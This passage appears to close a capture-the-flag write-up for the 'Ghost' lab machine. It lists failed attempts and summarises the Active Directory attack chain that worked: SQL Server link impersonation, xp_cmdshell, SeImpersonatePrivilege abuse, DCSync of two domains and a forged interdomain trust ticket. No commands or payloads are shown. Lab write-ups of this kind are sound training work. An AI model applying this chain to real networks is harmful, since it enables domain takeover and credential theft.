- **Preserve failed attempts.** The `CreateProcess` error, missing `gp.exe`, UTF-16LE encoding issue, cache-name typo, unsupported `getST.py` argument, unreachable `10.0.0.10`, and `KRB_AP_ERR_BAD_INTEGRITY` all explain how the final route was narrowed down.

**Outcome:** Ghost was completed. The final confirmed chain used linked SQL Server impersonation, `xp_cmdshell`, `SeImpersonatePrivilege`, DCSync of `corp.ghost.htb`, a forged interdomain trust ticket, and DCSync of `ghost.htb`. The root flag was recovered; its literal value was not present in the retained session transcript.
